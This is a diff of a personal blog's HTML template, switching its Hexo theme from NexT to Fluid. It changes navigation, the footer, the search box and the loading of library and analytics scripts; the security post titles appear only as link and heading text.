+                      <a href="/2021/05/31/ISCC2021%E5%A8%B1%E4%B9%90/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ISCC2021娱乐</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/30/CISCN-2021-wp/">
+                        <span class="hidden-mobile">CISCN-2021-wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80"><span class="nav-number">3.</span> <span class="nav-text">栈溢出基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E6%8A%80%E6%9C%AF"><span class="nav-number">3.1.</span> <span class="nav-text">ROP技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">3.2.</span> <span class="nav-text">ret2text</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
+          </article>
+        </div>
+      </div>
     </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy; 
-  <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">丨S1lenc3丨</span>
-</div>
-
-
-<div class="powered-by">
-  Powered by <a class="theme-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
-</div>
-
-<div class="theme-info">
-  Theme -
-  <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
-  </a>
-</div>
-
-
-        
-<div class="busuanzi-count">
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-  
-    <span class="site-uv">
-      <i class="fa fa-user"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-      
-    </span>
-  
-
-  
-    <span class="site-pv">
-      <i class="fa fa-eye"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-      
-    </span>
-  
-</div>
-
-
-        
-      </div>
-    </footer>
-
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
       </div>
     
+  </div>
+</div>
 
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
   </div>
 
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
 
   
 
-
   
+</footer>
 
 
-
-
-
-
-
-
-
-
-
+  <!-- SCRIPTS -->
   
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
 
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
 
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-  
-  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+<!-- Plugins -->
 
 
   
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
-
-
-
+    <script  src="/js/img-lazyload.js" ></script>
   
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
 
 
 
@@ -836,47 +467,59 @@
 
 
 
-
-
-  
-
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
 
 
 
-
-
-  
-
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
 
 
 
-
-  
-
-  
-<script>
-(function(){
-    var bp = document.createElement('script');
-    var curProtocol = window.location.protocol.split(':')[0];
-    if (curProtocol === 'https') {
-        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
-    }
-    else {
-        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-    }
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
-</script>
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
 
 
-  
 
-  
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
 
-  
 
-  
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
 
 </body>
 </html>
